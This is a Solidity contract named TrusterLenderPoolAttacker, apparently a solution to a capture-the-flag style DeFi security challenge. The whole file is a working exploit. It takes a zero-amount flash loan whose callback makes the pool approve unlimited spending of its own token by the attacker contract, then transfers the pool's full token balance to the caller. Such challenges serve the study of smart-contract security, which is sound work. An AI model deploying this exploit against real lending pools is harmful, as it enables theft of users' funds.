// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "solmate/src/tokens/ERC20.sol";


interface Pool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
    function token() external view returns (address);
}


contract TrusterLenderPoolAttacker{
    function attack(address pool) external{
        address token = Pool(pool).token();
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        Pool(pool).flashLoan(0, address(this), token, data);

        ERC20(token).transferFrom(pool, msg.sender, ERC20(token).balanceOf(pool));
    }


}
